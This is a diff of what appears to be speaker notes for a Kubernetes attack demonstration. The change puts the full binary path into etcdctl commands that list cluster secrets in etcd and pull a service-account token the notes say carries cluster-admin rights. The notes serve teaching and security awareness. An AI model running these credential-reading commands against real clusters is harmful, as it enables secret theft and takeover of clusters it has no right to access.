@@ -367,17 +367,17 @@ Show the YAML for the etcdclient pod. Note the specified node, and the credentia
 
 Now we can run etcdclient and check if we have a connection to etcd
 
-`kubectl exec etcdclient -- etcdctl member list`
+`kubectl exec etcdclient -- /usr/local/bin/etcdctl member list`
 
 SLIDE 25 Show etcdclient pod connecting to etcd
 
 Etcd contains a lot of interesting information about the cluster, not least of which is secrets.
 
-`kubectl exec etcdclient -- etcdctl get '' --keys-only --from-key | grep secrets`
+`kubectl exec etcdclient -- /usr/local/bin/etcdctl get '' --keys-only --from-key | grep secrets`
 
 There is a role here which has cluster-admin rights by default, let's see if we can get that token :
 
-`k exec etcdclient -- etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jvl8m`
+`k exec etcdclient -- /usr/local/bin/etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jvl8m`
 
 We have the token, what can it do ? 
 
